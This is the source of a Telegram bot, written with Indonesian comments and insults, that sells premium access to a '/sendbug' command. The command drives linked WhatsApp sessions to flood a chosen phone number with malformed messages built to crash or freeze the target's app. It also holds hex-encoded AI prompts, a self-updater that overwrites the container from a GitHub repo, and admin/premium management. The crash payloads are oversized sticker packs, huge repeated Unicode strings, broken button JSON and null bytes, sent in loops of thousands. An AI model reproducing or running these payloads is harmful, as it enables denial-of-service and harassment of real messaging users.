const proxy4 = "4d75 6c61 6920 7365 6b61 7261 6e67 206b 616d 7520 6265 7270 6572 616e 2073 6562 6167 6169 2067 7572 7520 6461 6e20 6d65 6e74 6f72 2062 656c 616a 6172 2e20 5475 6761 736d 7520 6164 616c 6168 206d 656d 6261 6e74 7520 6d65 6e6a 656c 6173 6b61 6e20 6265 7262 6167 6169 2074 6f70 696b 2064 656e 6761 6e20 6361 7261 2079 616e 6720 6d75 6461 6820 6469 7061 6861 6d69 2c20 6a65 6c61 732c 2064 616e 2062 6572 7461 6861 702e 204a 696b 6120 7365 7365 6f72 616e 6720 6265 7274 616e 7961 2073 6573 7561 7465 752c 206a 656c 6173 6b61 6e20 6461 7269 2064 6173 6172 2074 6572 6c65 6269 6820 6461 6875 6c75 206c 616c 7520 6c61 6e6a 7574 206b 6520 7065 6e6a 656c 6173 616e 2079 616e 6720 6c65 6269 6820 6461 6c61 6d20 6a69 6b61 2064 6970 6572 6c75 6b61 6e2e 2047 756e 616b 616e 2062 6168 6173 6120 7961 6e67 2073 6564 6572 6861 6e61 2064 616e 2063 6f6e 746f 6820 6167 6172 206d 7564 6168 2064 696d 656e 6765 7274 692e 204a 696b 6120 746f 7069 6b6e 7961 2073 756c 6974 2c20 7065 6361 6820 7065 6e6a 656c 6173 616e 206d 656e 6a61 6469 206c 616e 6773 6b61 682d 6c61 6e67 6b61 6820 6b65 6369 6c2e 204a 696b 6120 7065 726c 752c 2062 6572 696b 616e 2063 6f6e 746f 682c 2061 6e61 6c6f 6769 2c20 6174 6175 206c 6174 6968 616e 2061 6761 7220 6f72 616e 6720 6269 7361 206d 656d 6168 616d 6920 6d61 7465 7269 2064 656e 6761 6e20 6c65 6269 6820 6261 696b 2e20 4a69 6b61 2073 6573 656f 7261 6e67 2062 656c 756d 206d 656e 6765 7274 692c 206a 656c 6173 6b61 6e20 6b65 6d62 616c 6920 6465 6e67 616e 2063 6172 6120 7961 6e67 2062 6572 6265 6461 2073 616d 7061 6920 6d65 7265 6b61 2070 6168 616d 2e20 466f 6b75 7320 7061 6461 206d 656d 6275 6174 206f 7261 6e67 2062 656e 6172 2d62 656e 6172 206d 656d 6168 616d 692c 2062 756b 616e 2068 616e 7961 206d 656d 6265 7269 206a 6177 6162 616e 2073 696e 676b 6174 2e";

const chatgpt = `https://chatgpt.com/api/`

bot.onText(/^\/chatbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const question = match[1].trim();
  
  if (!isPremium(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Najis lu kontolll, fiture ini kaga iso lu pake");
  }

  await bot.sendMessage(chatId, 
    `📝 Pertanyaa lu: ${question} Pilih mode jawaban:`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📚 BELAJAR", callback_data: `chat_mode|belajar|${userId}|${question}` },
            { text: "💻 CODING", callback_data: `chat_mode|coding|${userId}|${question}` }
          ],
          [
            { text: "🤗 CURHAT", callback_data: `chat_mode|curhat|${userId}|${question}` },
            { text: "🤖 DEFAULT", callback_data: `chat_mode|default|${userId}|${question}` }
          ]
        ]
      }
    }
  );
});

bot.on("callback_query", async (query) => {
  const data = query.data;
  
  if (!data.startsWith("chat_mode|")) return;
  
  const [_, mode, userId, question] = data.split('|');
  const chatId = query.message.chat.id;
  
  if (query.from.id.toString() !== userId) {
    await bot.answerCallbackQuery(query.id, {
      text: "❌ Woi ngentod ini bukan pertanyaan lu bego",
      show_alert: true
    });
    return;
  }

  await bot.answerCallbackQuery(query.id);
  await bot.deleteMessage(chatId, query.message.message_id);
  await bot.sendChatAction(chatId, "typing");

  try {
    let systemPrompt = zephyrineUrl(proxy1);
    
    if (mode === "curhat") {
      systemPrompt = zephyrineUrl(proxy2);
    } else if (mode === "coding") {
      systemPrompt = zephyrineUrl(proxy3);
    } else if (mode === "belajar") {
      systemPrompt = zephyrineUrl(proxy4);
    }
    
    const response = await axios.post(zephyrineUrl(seed), {
      text: question,
      systemPrompt: systemPrompt,
      sessionId: "default-session"
    }, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 30000
    });

    const answer = response.data;
    
    const modeIcons = {
      curhat: "🤗",
      coding: "💻", 
      belajar: "📚",
      default: "🤖"
    };
    
    await bot.sendMessage(chatId, `${modeIcons[mode]} Mode ${mode}
    ${answer}`, {
      parse_mode: "Markdown"
    });

  } catch (error) {
    await bot.sendMessage(chatId, "ai lagi error bjir");
  }
});

// BY SANZOPE NO HAPUS CREDIT KONTOL 
//KHUSUS PENGGUNAAN PANEL PTERODACTYL 
const GH_OWNER = "Mirzzasep";
const GH_REPO = "update";
const GH_BRANCH = "main";


async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Proses Auto Update");

    try {
        await downloadRepo("");
        bot.sendMessage(chatId, "✅ Update selesai!\n🔁 Bot restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        bot.sendMessage(chatId, "❌ Gagal update, cek repo GitHub atau koneksi.");
        console.error(e);
    }
});
// Acces !!
const pendingPremium = {};

bot.onText(/\/addprem (.+)/, async (msg, match) => {

  const chatId = msg.chat.id
  const senderId = msg.from.id

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId,"❌ Akses ditolak")
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g,""))

  if (!userId) {
    return bot.sendMessage(chatId,"❌ Contoh: /addprem 123456789")
  }

  const options = [
    "💎 7 Hari",
    "👑 14 Hari",
    "🚀 30 Hari",
    "♾️ Permanent"
  ]

  const poll = await bot.sendPoll(
    chatId,
    "💎 PILIH DURASI PREMIUM",
    options,
    { is_anonymous:false }
  )

  pendingPremium[poll.poll.id] = {
    userId:userId,
    adminId:senderId,
    chatId:chatId
  }

})

bot.on("poll_answer", (answer) => {

  const pollData = pendingPremium[answer.poll_id]
  if (!pollData) return

  if (answer.user.id !== pollData.adminId) return

  const choice = answer.option_ids[0]

  let days

  if (choice === 0) days = 7
  if (choice === 1) days = 14
  if (choice === 2) days = 30
  if (choice === 3) days = "permanent"

  let expiresAt

  if (days === "permanent") {
    expiresAt = "permanent"
  } else {
    expiresAt = Date.now() + days * 86400000
  }

  const existing = premiumUsers.find(u => u.id === pollData.userId)

  if (!existing) {
    premiumUsers.push({
      id: pollData.userId,
      expiresAt
    })
  } else {
    existing.expiresAt = expiresAt
  }

  savePremiumUsers()

  bot.sendMessage(
    pollData.chatId,
`✅ Premium berhasil ditambahkan

👤 User ID : ${pollData.userId}
⏳ Durasi : ${days === "permanent" ? "Permanent" : days + " Hari"}`
  )

  delete pendingPremium[answer.poll_id]

})

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, thumbnailUrl, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Vannˋ 𖣂 ˋOwner", url: "https://t.me/fanztech" }]
        ]
      }
    });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "<blockquote>Excovlod [ 𖣂 ]</blockquote>\nList - Premium\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

  if (!isOwner(senderId)) {
    return bot.sendVideo(chatId, thumbnailUrl, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Vannˋ 𖣂 ˋOwner", url: "https://t.me/fanztech" }]
        ]
      }
    });
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${senderId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${senderId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${senderId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendVideo(chatId, thumbnailUrl, {
      caption: `
<blockquote>Owner Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Vannˋ 𖣂 ˋOwner", url: "https://t.me/fanztech" }]
        ]
      }
    });
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

// ~ Case Bug
function createBugSuccessMessage(targetNumber, bugType, date) {
    return `
<blockquote>⬡═―—⊱「 Invictus Shadow  」⊰―—═⬡</blockquote>

◉ Target : ${targetNumber}
◉ Type Bug : ${bugType}
◉ Status : Successfully Send
◉ Date Now : ${date}

<blockquote>⸙ Spam Free at will</blockquote>`
}

function createCheckButton(targetNumber) {
    return {
        inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${targetNumber}` }]
        ]
    }
}

bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const userId = msg.from.id;
    const senderId = msg.from.id 
    const randomImage = getRandomImage();
    
    if (!isPremium(userId)) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `🚫 Akses ditolak!

Lu bukan user premium 😹
Beli akses dulu ke owner ya`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "👑 Owner", url: "https://t.me/Mirzzxkntll" }]
          ],
        },
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format Valid : /sendbug 628xxx",
        {
          parse_mode: "HTML",
          reply_to_message_id: msg.message_id
        }
      )
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`

    // Perbaikan: Ganti fromId menjadi senderId agar tidak undefined
    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `⏰ ☇ Tunggu ${cooldown} detik sebelum mengirim lagi.`,
        { reply_to_message_id: msg.message_id }
      )
    }

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ ☇ Tidak ada bot Whatsapp",
        { reply_to_message_id: msg.message_id }
      )
    }

    const userPollData = {
      targetNumber: formattedNumber,
      target: target,
      chatId: chatId,
      messageId: null,
      fromId: senderId
    }

    if (!global.userPollData) global.userPollData = new Map()
    global.userPollData.set(senderId, userPollData)

    const caption = `
<blockquote>SELECT TYPE BUG</blockquote>

◉ Target : ${formattedNumber}
◉ Status : Select Type Bug Dibawah

<blockquote>Note : Setelah Lewat 10 Menit Otomatis Default Ke Type ForceVC</blockquote>`

    const pollMessage = await bot.sendPoll(
      chatId,
      caption,
      ["Chatms", "Douwes", "Quiksilver", "xploit", "Ganesha"], 
      {
        is_anonymous: false,
        allows_multiple_answers: false,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      }
    )

    userPollData.messageId = pollMessage.message_id
    userPollData.pollId = pollMessage.poll.id
    global.userPollData.set(senderId, userPollData)

    const pollChatId = chatId
    const pollMessageId = pollMessage.message_id
    const pollTargetNumber = formattedNumber
    const pollTarget = target
    const pollUserId = senderId
    const savedPollId = pollMessage.poll.id

    setTimeout(async () => {
      try {
        const userData = global.userPollData?.get(pollUserId)
        if (!userData || userData.pollId !== savedPollId) {
          return
        }
        
        const date = getCurrentDate()
        const endCaption = `
<blockquote>⸙ POLLING SELESAI</blockquote>

◉ Target : ${pollTargetNumber}
◉ Status : Waktu habis, menggunakan pilihan default: FORCEVC
◉ Action : Sending Bug...`

        const pollEndMsg = await bot.sendMessage(pollChatId, endCaption, {
          parse_mode: "HTML",
          reply_to_message_id: pollMessageId
        })

        const sendingCaption = `
<blockquote>⸙ SENDING BUG</blockquote>

◉ Bug Type : FORCEVC
◉ Target : ${pollTargetNumber}
◉ Status : Processing...`

        const sendingMsg = await bot.sendMessage(pollChatId, sendingCaption, {
          parse_mode: "HTML"
        })

        setTimeout(async () => {
          try {
            await bot.deleteMessage(pollChatId, pollEndMsg.message_id)
            await bot.deleteMessage(pollChatId, sendingMsg.message_id)
          } catch (deleteErr) {}
        }, 1000)

        global.userPollData.delete(pollUserId)
        await handleForceVC(pollChatId, pollMessageId, pollTargetNumber, pollTarget, date, pollUserId)

      } catch (err) {
        console.error("Poll timer error:", err)
      }
    }, 600000)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ ☇ Error : ${err.message}`, { reply_to_message_id: msg.message_id })
  }
})

bot.on('poll_answer', async (pollAnswer) => {
  try {
    const fromId = pollAnswer.user.id
    const pollId = pollAnswer.poll_id
    const optionIds = pollAnswer.option_ids

    let foundUserData = null
    let foundUserId = null
    
    for (const [userId, userData] of global.userPollData?.entries() || []) {
      if (userData.pollId === pollId) {
        foundUserData = userData
        foundUserId = userId
        break
      }
    }

    if (!foundUserData || optionIds.length === 0) return

    const selectedOption = optionIds[0]
    const bugTypes = ["Chatms", "Douwes", "Quiksilver", "xploit", "blank"]
    const bugType = bugTypes[selectedOption]

    const { targetNumber, target, chatId, messageId } = foundUserData
    const date = getCurrentDate()

    if (foundUserId) global.userPollData.delete(foundUserId)

    const endCaption = `
<blockquote>⸙ POLLING SELESAI</blockquote>

◉ Target : ${targetNumber}
◉ Bug Terpilih : ${bugType.toUpperCase()}
◉ Status : Sending Bug...`

    const pollEndMsg = await bot.sendMessage(chatId, endCaption, {
      parse_mode: "HTML",
      reply_to_message_id: messageId
    })

    const sendingCaption = `
<blockquote>⸙ SENDING BUG</blockquote>

◉ Bug Type : ${bugType.toUpperCase()}
◉ Target : ${targetNumber}
◉ Status : Processing...`

    const sendingMsg = await bot.sendMessage(chatId, sendingCaption, {
      parse_mode: "HTML"
    })

    setTimeout(async () => {
      try {
        await bot.deleteMessage(chatId, pollEndMsg.message_id)
        await bot.deleteMessage(chatId, sendingMsg.message_id)
      } catch (e) {}
    }, 1000)

    // Perbaikan: Pastikan sock diambil dari session yang aktif
    const sock = sessions.values().next().value; 

    switch (bugType) {
      case 'Chatms':
        await handleForceVC(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'Douwes':
        await handleForceCall(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'Quiksilver':
        await handleDelayInvis(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'xploit':
        await handleStuckhome(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
      case 'blank':
        await Blankchat(chatId, messageId, targetNumber, target, date, fromId, sock)
        break
    }
  } catch (err) {
    console.error("Poll Answer ERROR:", err)
  }
})

// Perbaikan: Tambahkan parameter 'sock' ke fungsi handle agar tidak error undefined
async function handleForceVC(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "ForceVC", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 35; i++) {
        await VisiFriend(sock, target);
        await new Promise(resolve => setTimeout(resolve, 1500));
      }
    } catch (err) {}
  }, 100)
}

async function handleForceCall(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "ForceCall", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 100; i++) {
        await OfferXForclose(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

async function handleDelayInvis(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "DelayInvis", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 10; i++) {
        await CarouselLolipop(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
        await Bulldozer(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

async function handleStuckhome(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "Stuckhome", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 70; i++) {
        await MbaPe(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

async function Blankchat(chatId, messageId, targetNumber, target, date, fromId, sock) {
  const successMessage = createBugSuccessMessage(targetNumber, "ForceIPhone", date)
  await bot.sendMessage(chatId, successMessage, { parse_mode: "HTML", reply_markup: createCheckButton(targetNumber) })
  
  setTimeout(async () => {
    try {
      if (!sock) return;
      for (let i = 0; i < 100; i++) {
        await xryybgangkang(sock, target);
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    } catch (err) {}
  }, 100)
}

// ~ function Bugs 
async function xryybgangkang(sock, target) {
  const displayText = "𑜦𑜠".repeat(10000);
  for (let i = 0; i < 20000; i++) {
    const stickerMsg = {
      stickerPackMessage: {
        stickerPackId: "X",
        name: displayText,
        publisher: displayText,
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "ꦾ Super Juniorꦾ",
            isLottie: true,
            mimetype: "꧀꧀꧀PDF꧀꧀꧀",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {},
        packDescription: "ꦾ XRyyMauCrotꦾ".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    };
    await sock.relayMessage(target, stickerMsg, {});
  }

  const botMsg = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '00000@newsletter',
          newsletterName: "ꦾ".repeat(60000),
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBRRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
          caption: "ꦾ".repeat(90000),
          inviteExpiration: Date.now() + 0x99999999999abcdef,
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "[{".repeat(10000),
        buttons: [
          {
            name: "mpm",
            buttonParamsJson: "\u0000".repeat(0000000)
          },
          {
            name: "single_select",
            buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(9999999) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({ status: "4" })
          },
          {
            name: "call_permission_request",
            buttonParamsJson: "[{".repeat(808808)
          },
          {
            name: "name_message",
            buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            }),
            version: 3
          },
          {
            name: "address_message",
            buttonParamsJson: JSON.stringify({ addressMessage: null })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: displayText,
                url: "https://xxxnx" + displayText + ".com"
            })
          },
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({ caption: "salam hangat".repeat(9000) })
          }
        ]
      }
    }
  };

  await sock.relayMessage(target, botMsg, {
    groupId: null,
    participant: { jid: target }
  });

  const ephemeralMsg = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
              fileLength: "9999999999999",
              pageCount: 9999999999999,
              mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
              fileName: "༿༑ᜳ🍭ϟ",
              fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
              directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
              mediaKeyTimestamp: 1735456100,
              contactVcard: true,
              caption: "F*ucking"
            }
          },
          body: { text: " " },
      
          nativeFlowMessage: {
            messageParamsJson: "{}",
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: "paket", id: "99999999" })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: displayText,
                  url: "https://xxxnx" + displayText + ".com"
                })
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, ephemeralMsg, {
    groupId: null,
    participant: { jid: target }
  });
}
// ~ End Function Bugs
